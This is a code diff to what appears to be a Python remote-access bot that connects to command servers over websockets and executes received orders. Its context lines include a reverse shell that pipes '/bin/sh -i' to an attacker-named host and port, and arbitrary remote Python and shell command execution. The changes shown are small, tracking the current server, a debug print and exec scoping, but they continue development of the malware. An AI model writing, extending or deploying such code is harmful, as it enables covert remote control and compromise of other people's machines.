@@ -31,6 +31,7 @@ state = {
 }
 
 modules = {}
+current_host = ""
 
 def load_state():
 	global state
@@ -66,7 +67,7 @@ async def safe_call(callable) -> bool:
 	return False
 
 async def main():
-	global ws
+	global ws, current_host
 	while True:
 		time.sleep(1)
 
@@ -88,6 +89,7 @@ async def main():
 		for server in state["servers"]:
 			try:
 				async with connect(f"ws://{server}/machines/ws/{state['version']}/{state['uid']}") as websocket:
+					current_host = server
 					ws = websocket
 					print("Joined")
 					for i in modules.values():
@@ -101,13 +103,14 @@ async def main():
 							if data["event"] == "order":
 								for c in data["orders"]:
 									try:
+										print(c["type"])
 										match c["type"]:
 											case "shell":
 												s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 												s.connect((c["host"],c["port"]))
 												subprocess.Popen(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())
 											case "python":
-												exec(c["code"])
+												exec(c["code"], globals(), locals())
 											case "run":
 												subprocess.Popen(c["code"],shell=True)
 											case "update":
@@ -116,7 +119,7 @@ async def main():
 												os.execv(sys.executable, [sys.executable] + sys.argv)
 											case "install_module":
 												state["modules"][c["name"]] = {"code": c["code"]}
-												exec(c["code"])
+												exec(c["code"], globals(), locals())
 												if await safe_call(modules[c["name"]]["install"]):
 													await websocket.send(json.dumps({"event":"module_installed", "name": c["name"]}))
 													save_state()
